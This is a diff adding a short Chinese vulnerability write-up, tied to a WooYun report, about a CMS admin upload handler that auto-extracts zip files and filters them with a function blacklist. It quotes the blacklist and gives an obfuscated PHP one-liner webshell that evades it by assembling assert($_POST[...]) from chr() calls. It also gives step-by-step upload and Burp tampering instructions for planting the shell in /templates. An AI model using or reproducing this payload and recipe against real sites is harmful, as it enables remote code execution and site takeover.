@@ -1,0 +1,18 @@
+http://www.wooyun.org/bugs/wooyun-2015-0134479
+
+漏洞文件：admin\include\uploadify.php  206行
+
+黑名单过滤：
+$danger=explode('|','preg_replace|assert|dirname|file_exists|file_get_contents|file_put_contents|fopen|mkdir|unlink|readfile|eval|cmd|passthru|system|gzuncompress|exec|shell_exec|fsockopen|pfsockopen|proc_open|scandir');
+
+$ban='preg_replace|assert|eval|\$_POST|\$_GET'; 
+
+
+上传.zip 文件会自动解压，不过有过滤，但是是采用黑名单方式，可以轻易绕过。
+如下面的一句话
+
+<?php $a=range(1,200);$b=chr($a[96-1+1]).chr($a[114-1+1]).chr($a[114-1+1]).chr($a[100-1+1]).chr($a[113-1+1]).chr($a[115-1+1]); $b(${chr($a[94]).chr($a[79]).chr($a[78]).chr($a[82]).chr($a[83])}[chr($a[51])]); ?>  
+
+保存为kk.php文件，并压缩为kk.zip格式 
+
+在后台找个能上传的的地方上传, 设置代理，Burp抓包，修改参数 type=skin 上传成功后在/templates目录下生成 kk.php
